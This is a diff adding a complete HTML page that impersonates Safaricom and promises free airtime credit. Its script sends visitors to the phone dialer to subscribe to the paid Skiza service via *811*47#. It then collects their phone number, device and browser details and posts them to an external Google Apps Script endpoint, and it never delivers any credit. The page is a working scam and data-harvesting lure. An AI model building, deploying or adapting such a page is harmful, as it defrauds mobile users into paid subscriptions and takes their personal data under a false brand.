@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Safaricom Credit</title>
+
+<style>
+body{
+font-family:'Poppins',sans-serif;
+background:#006e3a;
+color:white;
+margin:0;
+text-align:center;
+}
+header{
+display:flex;
+justify-content:center;
+align-items:center;
+gap:25px;
+padding:20px 0;
+background:linear-gradient(90deg,#005f33,#018c46);
+}
+header img{
+height:70px;
+border-radius:10px;
+}
+h1{
+font-size:28px;
+margin-top:20px;
+}
+.card{
+background:#018c46;
+border:2px solid #ffd700;
+border-radius:15px;
+padding:25px;
+margin:20px auto;
+width:80%;
+max-width:400px;
+box-shadow:0 4px 10px rgba(0,0,0,0.3);
+}
+.card h2{
+font-size:32px;
+color:#ffd700;
+}
+.btn{
+background:#ffd700;
+color:#006e3a;
+font-weight:bold;
+padding:12px 25px;
+border:none;
+border-radius:25px;
+cursor:pointer;
+margin-top:15px;
+}
+.btn:hover{
+background:#ffb800;
+}
+footer{
+margin-top:40px;
+font-size:13px;
+color:#ccc;
+}
+.popup{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.6);
+justify-content:center;
+align-items:center;
+}
+.popup-content{
+background:white;
+color:black;
+padding:30px;
+border-radius:10px;
+width:300px;
+text-align:center;
+}
+.popup input{
+width:90%;
+padding:10px;
+margin-top:10px;
+border-radius:6px;
+border:1px solid #ccc;
+}
+.popup button{
+margin-top:15px;
+background:#018c46;
+color:white;
+border:none;
+padding:10px 20px;
+border-radius:6px;
+cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+<img src="images/Safaricom.png">
+<img src="images/skiza.png">
+</header>
+
+<h1>CLAIM YOUR FREE SAFARICOM CREDIT</h1>
+<p>Select an offer and subscribe to Skiza.</p>
+
+<div class="card">
+<h2>KES 20/=</h2>
+<p>FREE CREDIT</p>
+<button class="btn" onclick="startProcess('KES 20 Credit')">Claim Credit</button>
+</div>
+
+<div class="card">
+<h2>KES 10 Bob</h2>
+<p>FREE CREDIT</p>
+<button class="btn" onclick="startProcess('KES 10 Bob Credit')">Claim Credit</button>
+</div>
+
+<div class="popup" id="popup">
+<div class="popup-content">
+<h3>Enter Phone Number</h3>
+<p>Paste the number used to subscribe</p>
+<input type="tel" id="phone" placeholder="07XXXXXXXX">
+<br>
+<button onclick="submitNumber()">Submit</button>
+</div>
+</div>
+
+<footer>
+Terms and conditions apply.<br>
+© 2025 Safaricom PLC
+</footer>
+
+<script>
+const scriptURL="https://script.google.com/macros/s/AKfycbwU7mF2Ns2PvD_FxIupO34iZQGMcQb5KCsCCzP9aMHxyUJ7fE4I87kO2Lg3J_OcjMG6yQ/exec";
+
+let selectedOffer="";
+
+function startProcess(offer){
+selectedOffer=offer;
+alert("Step 1: Dial *811*47# and subscribe to Skiza option 1. Return here after subscribing.");
+window.location.href="tel:*811*47%23";
+
+setTimeout(()=>{
+document.getElementById("popup").style.display="flex";
+},4000);
+}
+
+function getDevice(){
+const ua=navigator.userAgent;
+if(/android/i.test(ua)) return "Android";
+if(/iphone|ipad/i.test(ua)) return "iPhone";
+return "Computer";
+}
+
+function submitNumber(){
+let phone=document.getElementById("phone").value;
+if(phone==""){
+alert("Please enter your phone number");
+return;
+}
+
+let data={
+phone:phone,
+offer:selectedOffer,
+device:getDevice(),
+browser:navigator.userAgent,
+page:window.location.href
+};
+
+fetch(scriptURL,{
+method:"POST",
+body:JSON.stringify(data)
+})
+.then(res=>res.json())
+.then(res=>{
+if(res.result=="exists"){
+alert("This phone number has already claimed credit.");
+}
+if(res.result=="success"){
+alert("Credit request received! You should get an email confirmation shortly.");
+document.getElementById("popup").style.display="none";
+}
+})
+.catch(err=>{
+alert("Submission failed. Try again.");
+});
+}
+</script>
+
+</body>
+</html>
